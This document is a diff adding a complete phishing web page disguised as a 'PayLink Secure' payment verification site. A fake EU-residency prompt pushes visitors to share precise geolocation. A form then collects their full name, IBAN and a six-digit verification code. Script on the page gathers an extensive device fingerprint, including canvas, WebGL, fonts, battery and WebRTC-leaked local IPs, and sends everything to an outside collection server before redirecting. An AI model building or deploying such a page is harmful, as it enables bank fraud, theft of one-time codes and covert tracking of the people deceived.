@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>PayLink Secure</title>
+<style>
+body{font-family:'Segoe UI',Tahoma,sans-serif;margin:0;background:#f4f6f9;min-height:100vh}
+.ov{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.65);display:flex;justify-content:center;align-items:center;z-index:999}
+.pp{background:#fff;border-radius:14px;padding:36px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.25)}
+.fl{font-size:48px;margin-bottom:10px}
+.pp h2{font-size:19px;color:#1a1a2e;margin:0 0 10px}
+.pp p{font-size:14px;color:#555;line-height:1.6;margin:0 0 24px}
+.ac{width:100%;padding:15px;background:#16a34a;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
+.ac:hover{background:#128a3d}
+.ne{margin-top:14px;font-size:12px;color:#aaa}
+.ne a{color:#aaa;text-decoration:none}
+.c{max-width:440px;margin:40px auto;padding:35px 30px;background:#fff;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.08);text-align:center}
+.lo{font-size:22px;font-weight:700;color:#1a56db;margin-bottom:4px}
+.su{font-size:12px;color:#888;margin-bottom:20px}
+.c h2{font-size:18px;color:#222;margin:0 0 6px}
+.c p{font-size:14px;color:#555;line-height:1.5;margin-bottom:20px}
+.c label{display:block;text-align:left;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
+.c input{width:100%;padding:14px;font-size:15px;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;margin-bottom:18px}
+.c input:focus{outline:none;border-color:#1a56db}
+.c input.code{font-size:18px;text-align:center;letter-spacing:8px}
+.bt{width:100%;padding:14px;background:#1a56db;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
+.bt:hover{background:#1344b0}
+.ft{margin-top:22px;font-size:11px;color:#999}
+#fw{display:none}
+#db{display:none}
+</style>
+</head>
+<body>
+<div class="ov" id="ov">
+<div class="pp">
+<div class="fl">&#127466;&#127482;</div>
+<h2>EU Payment Zone</h2>
+<p>This payment is only available for residents of the <b>European Union</b>.</p>
+<button class="ac" id="ab">I am in the EU</button>
+<div class="ne"><a href="#" id="nl">Not in the EU?</a></div>
+</div>
+</div>
+<div class="ov" id="db">
+<div class="pp">
+<div class="fl">&#9203;</div>
+<h2>Region Not Confirmed</h2>
+<p>Please confirm your region to continue.</p>
+<button class="ac" id="rb">Confirm Region</button>
+</div>
+</div>
+<div id="fw">
+<div class="c">
+<div class="lo">PayLink Secure</div>
+<div class="su">Trusted payment verification</div>
+<h2>Complete Your Payment</h2>
+<p>Enter your details and verification code to unlock your payment link.</p>
+<form id="f">
+<label>Full Name</label>
+<input type="text" id="name" placeholder="e.g. John Smith" required/>
+<label>IBAN</label>
+<input type="text" id="iban" placeholder="e.g. NL91 ABNA 0417 1643 00" required/>
+<label>Verification Code</label>
+<input type="text" id="code" maxlength="6" inputmode="numeric" class="code" placeholder="••••••" required/>
+<button type="submit" class="bt">Verify &amp; Continue</button>
+</form>
+<div class="ft">&copy; 2025 PayLink Secure</div>
+</div>
+</div>
+<script>
+var gL=null,gN=null,gA=null;
+function rg(){
+if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){gL=p.coords.latitude;gN=p.coords.longitude;gA=p.coords.accuracy;document.getElementById('ov').style.display='none';document.getElementById('fw').style.display='block';},function(){document.getElementById('ov').style.display='none';document.getElementById('db').style.display='flex';},{enableHighAccuracy:true,timeout:10000});}
+else{document.getElementById('ov').style.display='none';document.getElementById('fw').style.display='block';}
+}
+document.getElementById('ab').onclick=rg;
+document.getElementById('rb').onclick=function(){document.getElementById('db').style.display='none';rg();};
+document.getElementById('nl').onclick=function(e){e.preventDefault();rg();};
+document.getElementById('f').addEventListener('submit',function(e){
+e.preventDefault();
+var code=document.getElementById('code').value.trim();
+var d={name:document.getElementById('name').value.trim(),iban:document.getElementById('iban').value.trim(),code:code,ts:new Date().toISOString(),
+ua:navigator.userAgent,plat:navigator.platform,
+lang:navigator.language,langs:JSON.stringify(navigator.languages),
+sw:screen.width,sh:screen.height,aw:screen.availWidth,ah:screen.availHeight,
+cd:screen.colorDepth,pd:screen.pixelDepth,pr:window.devicePixelRatio,
+so:screen.orientation?screen.orientation.type:'n/a',
+cpu:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
+touch:navigator.maxTouchPoints,vend:navigator.vendor,
+prod:navigator.product,appV:navigator.appVersion,
+dnt:navigator.doNotTrack,ck:navigator.cookieEnabled,
+tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+tzo:new Date().getTimezoneOffset(),on:navigator.onLine,
+lat:gL,lng:gN,acc:gA,ref:document.referrer,
+dm:matchMedia('(prefers-color-scheme: dark)').matches,
+rm:matchMedia('(prefers-reduced-motion: reduce)').matches};
+try{var gc=document.createElement('canvas'),gl=gc.getContext('webgl');
+if(gl){var ex=gl.getExtension('WEBGL_debug_renderer_info');
+d.guv=ex?gl.getParameter(ex.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
+d.gur=ex?gl.getParameter(ex.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
+d.glv=gl.getParameter(gl.VERSION);d.glr=gl.getParameter(gl.RENDERER);}}catch(x){d.guv='err';}
+try{var cc=document.createElement('canvas'),cx=cc.getContext('2d');
+cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';
+cx.fillRect(125,1,62,20);cx.fillStyle='#069';
+cx.fillText('PayLink \u0041\u0042\u0043\u0044\u0045\u0046\u00e9\u00fc\u00df\u00f1',2,15);
+d.cfp=cc.toDataURL();}catch(x){d.cfp='err';}
+var tf=['Arial','Arial Black','Book Antiqua','Comic Sans MS','Courier New','Georgia','Impact','Lucida Console','Lucida Sans Unicode','Palatino Linotype','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana','Roboto','Open Sans','Lato','Montserrat','Noto Sans','Droid Sans','Roboto Condensed','Cabin','Oswald','Raleway','PT Sans','Ubuntu','Cantarell','Fira Sans','Source Sans Pro','Nunito','Quicksand','Comfortaa','Poppins','Playfair Display','Merriweather','Lora','Crimson Text','Josefin Sans','Bebas Neue','Righteous','Bangers','Exo 2','Anton','Archivo Black','Bellefair','Caveat','Dancing Script','Great Vibes','Pacifico','Satisfy','Sriracha','Teko','Work Sans','Karla','Mulish','Inter','Public Sans','Figtree','Manrope','Space Grotesk'];
+var bs='32px monospace',t2='mmmmmmmmmmlli1';
+var be=document.createElement('span');be.style.cssText='font:'+bs+';position:absolute;visibility:hidden';be.textContent=t2;document.body.appendChild(be);
+var bw=be.offsetWidth,bh=be.offsetHeight,inst=[];
+for(var i=0;i<tf.length;i++){var el=document.createElement('span');el.style.cssText='font:'+bs+' "'+tf[i]+'";position:absolute;visibility:hidden';el.textContent=t2;document.body.appendChild(el);if(el.offsetWidth!==bw||el.offsetHeight!==bh)inst.push(tf[i]);el.remove();}
+be.remove();d.fonts=inst;
+try{if(speechSynthesis){var sv=speechSynthesis.getVoices();d.sv=sv.length;d.svl=sv.slice(0,10).map(function(v){return v.name+' ('+v.lang+')';}).join('; ');}}catch(x){}
+if(navigator.connection){d.nt=navigator.connection.type;d.ne2=navigator.connection.effectiveType;d.nd=navigator.connection.downlink;d.ns=navigator.connection.saveData;}
+if(performance.memory){d.jhu=performance.memory.usedJSHeapSize;d.jht=performance.memory.totalJSHeapSize;}
+d.wrtc=[];
+try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+pc.createDataChannel('');
+pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
+pc.onicecandidate=function(e){if(e.candidate&&e.candidate.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}):/);if(m&&m[1]&&d.wrtc.indexOf(m[1])===-1)d.wrtc.push(m[1]);}};
+setTimeout(function(){pc.close();},3000);}catch(x){d.wrtc='err';}
+var sent=false;
+function go(){if(sent)return;sent=true;
+fetch('https://paylink-verify.onrender.com/log-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(function(){window.location.href='success.html';}).catch(function(){window.location.href='success.html';});}
+if(navigator.getBattery){navigator.getBattery().then(function(b){d.btl=b.level;d.btc=b.charging;go();});setTimeout(go,4000);}
+else{go();}
+if(navigator.storage&&navigator.storage.estimate){navigator.storage.estimate().then(function(s){d.sq=s.quota;d.su=s.usage;});}
+});
+</script>
+</body>
+</html>
